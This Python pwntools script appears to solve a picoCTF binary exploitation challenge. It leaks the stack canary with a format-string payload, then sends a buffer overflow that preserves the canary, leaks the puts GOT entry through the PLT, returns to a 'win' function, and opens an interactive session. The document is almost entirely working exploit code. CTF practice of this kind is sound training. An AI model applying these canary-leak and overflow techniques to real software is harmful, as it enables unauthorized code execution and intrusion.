from pwn import *

exe = ELF("./vuln")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])

    else:
        r = remote("jupiter.challenges.picoctf.org", 15815)

    return r

def main():

    r = conn()
    r = gdb.debug(exe.path, '''
        break *0x080487e9
        continue
        ''')

    stage1(r)

    res = r.recvuntil(b'Name? ')
    print("stdout : ", res)

    canary = checkCanary(r)

    stage1(r)

    res = r.recvuntil(b'Name? ')
    print("stdout : ", res)

    print("canary : ", canary)
    canary_str=str(canary) # str: b'fdc8cf00\n'
    canary_str2 = canary_str[2:-3] # str: fdc8cf00
    decimal_int = int(canary_str2, 16)

    payload2 = b"A" * 4 * 128 + p32(decimal_int)

    payload_canary_cookie_to_ret = b"B" * 4 * 3

    payload2 += payload_canary_cookie_to_ret

    puts_plt = exe.plt['puts']
    puts_got = exe.got['puts']
    print("puts_plt : ", puts_plt, " ", p32(puts_plt))
    print("puts_got : ", puts_got, " ", p32(puts_got))

    payload2 += p32(puts_plt) + p32(exe.functions['win'].address) + p32(puts_got)

    r.sendline(payload2)
    print("stdin  : ", payload2)

    r.interactive()

def stage1(r):

    print(r.recvuntil(b'like to guess?'))

    payload = b"-2495"

    r.sendline(payload)
    print("stdin  : ", payload)

    res = r.recvline()
    print("stdout : ", res)

    res = r.recvline()
    print("stdout : ", res)

    if b'Nope' in res:
        print("No Hit!!!")
        exit()
    else:
        print("Hit!!!!!!")

def checkCanary(r):
    payload = b"%135$x"
    r.sendline(payload)
    print("stdin  : ", payload)

    res = r.recvuntil(b"Congrats: ")
    print("stdout : ", res)

    res = r.recvline()
    print("stdout : ", res)

    return res

if __name__ == "__main__":
    main()
